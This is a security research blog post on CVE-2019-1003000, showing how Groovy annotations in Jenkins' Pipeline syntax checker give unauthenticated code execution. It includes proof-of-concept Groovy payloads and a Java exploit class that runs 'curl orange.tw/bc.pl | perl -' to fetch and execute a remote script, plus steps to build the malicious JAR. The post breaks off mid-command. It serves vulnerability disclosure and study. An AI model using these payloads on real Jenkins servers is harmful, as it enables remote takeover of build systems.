
<!DOCTYPE html>
<html lang="zh-TW">
  <head>
    <meta charset="utf-8" />
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN) | DEVCORE</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
    <meta name="description" property="og:description" content="After Jenkins released the [Security Advisory](https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595) and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)" />
    <meta name="keywords" content="Advisory, Jenkins, RCE, CVE-2019-1003000" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN) | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20190219/cover.png" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN) | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="After Jenkins released the [Security Advisory](https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595) and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20190219/cover.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

  </head>
  <body>
    <div class="page">
      <div class="container--wrapper">
        <div class="topbar">
          <div class="topbar__brand">
            <a href="/en/">
                <div class="logo">
                  DEVCORE
                </div></a>
            <p class="slogan">
              We offer professional <a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services
            </p>
          </div>
          <div class="drawer" id="drawer">
            <div class="drawer__container">
              <nav class="main-menu">
                <div class="hidden">
                  Menu
                </div>
                <a href="/en/services/penetration-test" class="main-menu__link mobile-only">Penetration Testing</a>
                <a href="/en/services/red-team" class="main-menu__link mobile-only">Red Team Assessment</a>
                <a href="/en/services/security-consulting" class="main-menu__link mobile-only">Consulting</a>
                <a href="/en/services/security-training" class="main-menu__link mobile-only">Training</a>
                <a href="/en/about/" class="main-menu__link">Hackers</a><a href="/en/blog/" class="main-menu__link">News</a><a href="/en/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">Search</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
              </nav>
              <a href="/en/contact/" class="drawer__contact button--dense">Contact</a>
              <nav class="lang-menu">
                <div class="lang-menu__label">
                  Lang:
                </div>
                <a href="/" class="lang-menu__link">中文</a>
                <a href="/en/" class="lang-menu__link">English</a>
              </nav>
            </div>
          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
            <div class="bars">
              <div class="bar"></div>
              <div class="bar"></div>
              <div class="bar"></div>
            </div>
          </button>
        </div>
      </div><main role="main">


          <div class="container--wrapper">
            <div class="container">
              <section class="blog-header">
                <small class="blog-header__category"><a href="/en/blog/category/Tech Editorials/" style="text-transform: uppercase;">Tech Editorials</a></small>
                <img src="https://devco.re/assets/img/blog/20190219/cover.png" class="blog-header__image" alt="Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)" />
                <h1 class="blog-header__title">
                  Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)
                </h1>
                <div class="blog-header__tags">
                  
                  <a href="/en/blog/tag/Advisory/" class="blog-header__tag">Advisory</a><a href="/en/blog/tag/CVE/" class="blog-header__tag">CVE</a><a href="/en/blog/tag/RCE/" class="blog-header__tag">RCE</a>
                </div>
          
          
                <p class="blog-header__info">
                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/en/blog/author/orange" class="author-name">Orange Tsai</a> <time class="date">on 2019-02-19 </time>
                </p>
          
              </section>
              <article class="article">
          <p><a href="/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/">English Version</a><br />
<a href="/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/">中文版本</a></p>

<p>Hello everyone!</p>

<p>This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check the following link to get some basis and see how vulnerable Jenkins’ dynamic routing is!</p>
<ul>
  <li><a href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/">Hacking Jenkins Part 1 - Play with Dynamic Routing<br />
</a></li>
</ul>

<p>As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the <a href="http://jenkins.local/script">Script Console</a>)! Although we could bypass the first ACL, we still can’t do much things :(</p>

<p>After Jenkins released the <a href="https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595">Security Advisory</a> and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)</p>

<p><br /></p>

<h2 id="vulnerability-analysis">Vulnerability Analysis</h2>
<hr />

<p>First, we start from the Jenkins Pipeline to explain <a href="https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266">CVE-2019-1003000</a>! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)</p>

<p>In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but it’s too tough. So the easiest way is to reuse existing function and library!</p>

<p>As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="n">JSON</span> <span class="nf">doCheckScriptCompile</span><span class="o">(</span><span class="nd">@QueryParameter</span> <span class="n">String</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">CpsGroovyShell</span> <span class="n">trusted</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CpsGroovyShellFactory</span><span class="o">(</span><span class="kc">null</span><span class="o">).</span><span class="na">forTrusted</span><span class="o">().</span><span class="na">build</span><span class="o">();</span>
        <span class="k">new</span> <span class="nf">CpsGroovyShellFactory</span><span class="o">(</span><span class="kc">null</span><span class="o">).</span><span class="na">withParent</span><span class="o">(</span><span class="n">trusted</span><span class="o">).</span><span class="na">build</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">parseClass</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">CompilationFailedException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">JSONArray</span><span class="o">.</span><span class="na">fromObject</span><span class="o">(</span><span class="n">CpsFlowDefinitionValidator</span><span class="o">.</span><span class="na">toCheckStatus</span><span class="o">(</span><span class="n">x</span><span class="o">).</span><span class="na">toArray</span><span class="o">());</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">CpsFlowDefinitionValidator</span><span class="o">.</span><span class="na">CheckStatus</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">.</span><span class="na">asJSON</span><span class="o">();</span>
    <span class="c1">// Approval requirements are managed by regular stapler form validation (via doCheckScript)</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Here Jenkins validates the Pipeline with the method <a href="http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-">GroovyClassLoader.parseClass(…)</a>! It should be noted that this is just an AST parsing. Without running <code class="highlighter-rouge">execute()</code> method, any dangerous invocation won’t be executed! If you try to parse the following Groovy script, you get nothing :(</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">classLoader</span><span class="o">.</span><span class="na">parseClass</span><span class="o">(</span><span class="s1">'''
print java.lang.Runtime.getRuntime().exec("id")
'''</span><span class="o">);</span>
</code></pre></div></div>

<p>From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any <code class="highlighter-rouge">execute()</code> method, it’s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!</p>

<p><br /></p>

<h2 id="what-is-meta-programming">What is Meta-Programming</h2>
<hr />

<p>Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessor…) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!</p>

<p>If it is still hard to understand, you can just regard <code class="highlighter-rouge">eval(...)</code> as another Meta-Programming, which lets you operate the program on the fly. Although it’s a little bit inaccurate, it’s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:</p>

<ul>
  <li>C Macro</li>
  <li>C++ Template</li>
  <li>Java Annotation</li>
  <li>Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)</li>
  <li>DSL(Domain Specific Languages, such as <a href="http://sinatrarb.com/">Sinatra</a> and <a href="https://gradle.org/">Gradle</a>)</li>
</ul>

<p>When we are talking about Meta-Programming, we classify it into <strong>(1)compile-time</strong> and <strong>(2)run-time Meta-Programming</strong> according to the scope. Today, we focus on the compile-time Meta-Programming!</p>

<p><em>P.S. It’s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! <a href="https://en.wikipedia.org/wiki/Metaprogramming">Wiki</a>, <a href="https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561">Ref1</a>, <a href="http://cs.lmu.edu/~ray/notes/metaprogramming/">Ref2</a></em><br />
<em>P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &lt;(_ _)&gt;</em></p>

<p><br /></p>

<h2 id="how-to-exploit">How to Exploit?</h2>
<hr />

<p>From the previous section we know Jenkins validates Pipeline by <a href="http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-">parseClass(…)</a> and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?</p>

<p>There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as the macro expansion in C language:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
</span><span class="n">__int128</span> <span class="n">x</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">};</span>
</code></pre></div></div>

<p>or the compiler resource bomb(make a 16GB ELF by just 18 bytes):</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">main</span><span class="p">[</span><span class="o">-</span><span class="mi">1u</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">1</span><span class="p">};</span>
</code></pre></div></div>

<p>or calculating the Fibonacci number by compiler</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span><span class="o">&lt;</span><span class="kt">int</span> <span class="n">n</span><span class="o">&gt;</span>
<span class="k">struct</span> <span class="n">fib</span> <span class="p">{</span>
    <span class="k">static</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="n">fib</span><span class="o">&lt;</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="o">&gt;::</span><span class="n">value</span> <span class="o">+</span> <span class="n">fib</span><span class="o">&lt;</span><span class="n">n</span><span class="o">-</span><span class="mi">2</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span>
<span class="p">};</span>
<span class="k">template</span><span class="o">&lt;&gt;</span> <span class="k">struct</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span> <span class="p">{</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">};</span>
<span class="k">template</span><span class="o">&lt;&gt;</span> <span class="k">struct</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;</span> <span class="p">{</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">10</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span> <span class="c1">// 55</span>
    <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">20</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span> <span class="c1">// 6765</span>
    <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">40</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span> <span class="c1">// 102334155</span>
<span class="p">}</span>
</code></pre></div></div>

<p>From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>g++ template.cpp <span class="nt">-o</span> template
<span class="nv">$ </span>objdump <span class="nt">-M</span> intel <span class="nt">-d</span> template
...
00000000000005fa &lt;main&gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR <span class="o">[</span>rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR <span class="o">[</span>rbp-0x8],0x1a6d
 60c:   c7 45 <span class="nb">fc </span>cb 7e 19 06    mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR <span class="o">[</span>rax+rax<span class="k">*</span>1+0x0]
...
</code></pre></div></div>

<p>For more examples, you can refer to the article <a href="https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb">Build a Compiler Bomb</a> on StackOverflow!</p>

<p><br /></p>

<h3 id="first-attempt">First Attempt</h3>
<hr />

<p>Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official <a href="http://groovy-lang.org/metaprogramming.html">Meta-Programming manual</a> to find some exploitation ways. In the section 2.1.9, we found the <code class="highlighter-rouge">@groovy.transform.ASTTest</code> annotation. Here is its description:</p>

<blockquote>
  <p><code class="highlighter-rouge">@ASTTest</code> is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and <strong>perform assertions on the AST</strong> rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. <code class="highlighter-rouge">@ASTTest</code> can be placed on any annotable node and requires two parameters:</p>
</blockquote>

<p>What! <strong>perform assertions on the AST</strong>? Isn’t that what we want? Let’s write a simple Proof-of-Concept in local environment first:</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">classLoader</span><span class="o">.</span><span class="na">parseClass</span><span class="o">(</span><span class="s1">'''
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec("touch pwned")
})
def x
'''</span><span class="o">);</span>
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls
</span>poc.groovy

<span class="nv">$ </span>groovy poc.groovy
<span class="nv">$ </span><span class="nb">ls
</span>poc.groovy  pwned
</code></pre></div></div>

<p>Cool, it works! However, while reproducing this on the remote Jenkins, it shows:</p>

<blockquote>
  <p>unable to resolve class org.jenkinsci.plugins.workflow.libs.Library</p>

</blockquote>

<p><img src="/assets/img/blog/20190219/1.png" alt="" /></p>

<p>What the hell!!! What’s wrong with that?</p>

<p>With a little bit digging, we found the root cause. This is caused by the <a href="https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin">Pipeline Shared Groovy Libraries Plugin</a>! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That’s why the error <code class="highlighter-rouge">unsable to resolve class</code> occurs!</p>

<p>How to fix this problem? It’s simple! Just go to <a href="http://jenkins.local/pluginManager/">Jenkins Plugin Manager</a> and remove the <a href="https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin">Pipeline Shared Groovy Libraries Plugin</a>! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. It’s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!</p>

<p><br /></p>

<h3 id="second-attempt">Second Attempt</h3>
<hr />

<p>We continued reading the <a href="http://groovy-lang.org/metaprogramming.html">Groovy Meta-Programming manual</a> and found another interesting annotation - <code class="highlighter-rouge">@Grab</code>. There is no detailed information about <code class="highlighter-rouge">@Grab</code> on the manual. However, we found another article - <a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html">Dependency management with Grape</a> on search engine!</p>

<p>Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Grab</span><span class="o">(</span><span class="n">group</span><span class="o">=</span><span class="s1">'org.springframework'</span><span class="o">,</span> <span class="n">module</span><span class="o">=</span><span class="s1">'spring-orm'</span><span class="o">,</span> <span class="n">version</span><span class="o">=</span><span class="s1">'3.2.5.RELEASE'</span><span class="o">)</span>
<span class="kn">import</span> <span class="nn">org.springframework.jdbc.core.JdbcTemplate</span>
</code></pre></div></div>

<p>By using <code class="highlighter-rouge">@Grab</code> annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that’s enough. You can follow the <a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">PoC</a> proveded by <a href="https://github.com/adamyordan">@adamyordan</a> to execute arbitrary commands!</p>

<p>However, without a valid credential and <code class="highlighter-rouge">execute()</code> method, this is just an AST parser and you even can’t control files on remote server. So, what can we do? By diving into more about <code class="highlighter-rouge">@Grab</code>, we found another interesting annotation - <code class="highlighter-rouge">@GrabResolver</code>:</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@GrabResolver</span><span class="o">(</span><span class="n">name</span><span class="o">=</span><span class="s1">'restlet'</span><span class="o">,</span> <span class="n">root</span><span class="o">=</span><span class="s1">'http://maven.restlet.org/'</span><span class="o">)</span>
<span class="nd">@Grab</span><span class="o">(</span><span class="n">group</span><span class="o">=</span><span class="s1">'org.restlet'</span><span class="o">,</span> <span class="n">module</span><span class="o">=</span><span class="s1">'org.restlet'</span><span class="o">,</span> <span class="n">version</span><span class="o">=</span><span class="s1">'1.1.6'</span><span class="o">)</span>
<span class="kn">import</span> <span class="nn">org.restlet</span>
</code></pre></div></div>

<p>If you are smart enough, you would like to change the <code class="highlighter-rouge">root</code> parameter to a malicious website! Let’s try this in local environment:</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">classLoader</span><span class="o">.</span><span class="na">parseClass</span><span class="o">(</span><span class="s1">'''
@GrabResolver(name='restlet', root='http://orange.tw/')
@Grab(group='org.restlet', module='org.restlet', version='1.1.6')
import org.restlet
'''</span><span class="o">)</span>
</code></pre></div></div>

<pre><code class="language-log">11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] "HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1" 404 185 "-" "Apache Ivy/2.4.0"
</code></pre>

<p>Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?</p>

<p><br /></p>

<h2 id="the-way-to-code-execution">The Way to Code Execution</h2>
<hr />

<p>In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?</p>

<p>By diving into <a href="https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java">Grape implementation on Groovy</a>, we realized the library fetching is done by the class <a href="https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy">groovy.grape.GrapeIvy</a>! We started to find is there any way we can leverage, and we noticed an interesting method <a href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312">processOtherServices(…)</a>!</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">processOtherServices</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">,</span> <span class="n">File</span> <span class="n">f</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">ZipFile</span> <span class="n">zf</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ZipFile</span><span class="o">(</span><span class="n">f</span><span class="o">)</span>
        <span class="n">ZipEntry</span> <span class="n">serializedCategoryMethods</span> <span class="o">=</span> <span class="n">zf</span><span class="o">.</span><span class="na">getEntry</span><span class="o">(</span><span class="s2">"META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods"</span><span class="o">)</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">serializedCategoryMethods</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">processSerializedCategoryMethods</span><span class="o">(</span><span class="n">zf</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(</span><span class="n">serializedCategoryMethods</span><span class="o">))</span>
        <span class="o">}</span>
        <span class="n">ZipEntry</span> <span class="n">pluginRunners</span> <span class="o">=</span> <span class="n">zf</span><span class="o">.</span><span class="na">getEntry</span><span class="o">(</span><span class="s2">"META-INF/services/org.codehaus.groovy.plugins.Runners"</span><span class="o">)</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">pluginRunners</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">processRunners</span><span class="o">(</span><span class="n">zf</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(</span><span class="n">pluginRunners</span><span class="o">),</span> <span class="n">f</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="n">loader</span><span class="o">)</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">ZipException</span> <span class="n">ignore</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// ignore files we can't process, e.g. non-jar/zip artifacts</span>
        <span class="c1">// TODO log a warning</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>JAR file is just a subset of ZIP format. In the <a href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312">processOtherServices(…)</a>, Grape registers servies if there are some specified entry points. Among them, the <code class="highlighter-rouge">Runner</code> interests me. By looking into the implementation of <a href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335">processRunners(…)</a>, we found this:</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">processRunners</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">is</span><span class="o">,</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">is</span><span class="o">.</span><span class="na">text</span><span class="o">.</span><span class="na">readLines</span><span class="o">().</span><span class="na">each</span> <span class="o">{</span>
        <span class="n">GroovySystem</span><span class="o">.</span><span class="na">RUNNER_REGISTRY</span><span class="o">[</span><span class="n">name</span><span class="o">]</span> <span class="o">=</span> <span class="n">loader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">trim</span><span class="o">()).</span><span class="na">newInstance</span><span class="o">()</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Here we see the <code class="highlighter-rouge">newInstance()</code>. Does it mean that we can call <code class="highlighter-rouge">Constructor</code> on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file <code class="highlighter-rouge">META-INF/services/org.codehaus.groovy.plugins.Runners</code> and we can invoke the <code class="highlighter-rouge">Constructor</code> and execute arbitrary code!</p>

<p>Here is the full exploit:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Orange</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">Orange</span><span class="o">(){</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"curl orange.tw/bc.pl | perl -"</span><span class="o">;</span>
            <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="o">{</span><span class="s">"/bin/bash"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">payload</span><span class="o">};</span>
            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span> <span class="o">}</span>

    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>javac Orange.java
<span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> META-INF/services/
<span class="nv">$ </span><span class="nb">echo </span>Orange <span class="o">&gt;</span> META-INF/services/org.codehaus.groovy.plugins.Runners
<span class="nv">$ </span>find <span class="nb">.</span>
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

<span class="nv">$ </span>jar cvf poc-1.jar tw/
<span class="nv">$ </span><span class="nb">cp </span>poc-1.jar ~/www/tw/orange/poc/1/
